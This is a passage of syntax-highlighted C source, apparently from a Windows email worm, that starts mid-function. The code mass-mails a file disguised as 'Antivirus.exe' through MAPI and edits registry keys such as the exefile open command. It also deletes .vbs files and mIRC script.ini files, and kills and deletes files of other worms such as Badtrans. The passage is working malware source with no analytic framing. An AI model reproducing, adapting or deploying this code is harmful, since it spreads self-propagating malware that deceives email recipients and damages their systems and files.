            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">nPosition</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc6">"Antivirus.exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpFileType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">MSendMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">county</span><span class="sc10">++;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">MFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">MFreeBuffer</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">MLogoff</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Install"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"1"</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">General1</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc6">"exefile\\shell\\open\\command"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc6">"\"%1\" %*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"Windows"</span><span class="sc10">,</span><span class="sc6">"Run"</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"Windows"</span><span class="sc10">,</span><span class="sc6">"Load"</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">General2</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc6">"\\System.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"boot"</span><span class="sc10">,</span><span class="sc6">"shell"</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"boot"</span><span class="sc10">,</span><span class="sc6">"shell"</span><span class="sc10">,</span><span class="sc6">"explorer.exe"</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">vbsdel</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">abc</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fhandle</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sysdr</span><span class="sc10">,</span><span class="sc6">"\\*.vbs"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fhandle</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">sysdr</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fhandle</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">abc</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">abc</span><span class="sc10">=</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fhandle</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">fhandle</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">abc</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">windr</span><span class="sc10">,</span><span class="sc6">"\\*.vbs"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fhandle</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">windr</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fhandle</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">abc</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">wfd</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">abc</span><span class="sc10">=</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fhandle</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">mirc</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">mirch</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\mirc\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\mirc\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\mirc32\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\mirc32\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\irc\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\irc\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\chat\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\chat\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\progra~1\\mirc\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\progra~1\\mirc\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\progra~1\\mirc32\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\progra~1\\mirc32\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">mirch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"c:\\progra~1\\irc\\mirc.ini"</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"c:\\progra~1\\irc\\script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">mirch</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Badtrans</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">term</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sys</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">win</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">ssys</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">says</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">

  </span><span class="sc11">lSnapshot</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">rProcessFound</span><span class="sc10">=</span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">,&amp;</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rProcessFound</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc6">"INETD.EXE"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">myproc</span><span class="sc10">=</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_ALL_ACCESS</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">term</span><span class="sc10">=</span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc6">"KERN32.EXE"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">myproc</span><span class="sc10">=</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_ALL_ACCESS</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">term</span><span class="sc10">=</span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">rProcessFound</span><span class="sc10">=</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">,&amp;</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">osvi</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">OSVERSIONINFO</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">osvi</span><span class="sc10">.</span><span class="sc11">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">OSVERSIONINFO</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">GetVersionEx</span><span class="sc10">(&amp;</span><span class="sc11">osvi</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">osvi</span><span class="sc10">.</span><span class="sc11">dwPlatformId</span><span class="sc10">==</span><span class="sc11">VER_PLATFORM_WIN32_WINDOWS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"Windows"</span><span class="sc10">,</span><span class="sc6">"Run"</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteValue</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc6">"Run"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegDeleteValue</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc6">"kernel32"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sys</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">win</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">ssys</span><span class="sc10">,</span><span class="sc11">sys</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">ssys</span><span class="sc10">,</span><span class="sc6">"\\hksdll.dll"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sys</span><span class="sc10">,</span><span class="sc6">"\\KERN32.EXE"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">ssys</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">sys</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">says</span><span class="sc10">,</span><span class="sc11">win</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">says</span><span class="sc10">,</span><span class="sc6">"\\hkk32.exe"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">win</span><span class="sc10">,</span><span class="sc6">"\\INETD.EXE"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">win</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">says</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">win</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">PPark</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">term</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sysy</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">

  </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc6">"exefile\\shell\\open\\command"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc6">"\"%1\" %*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">lSnapshot</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">rProcessFound</span><span class="sc10">=</span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">,&amp;</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rProcessFound</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc6">"FILES32.VXD"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">myproc</span><span class="sc10">=</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_ALL_ACCESS</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">term</span><span class="sc10">=</span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
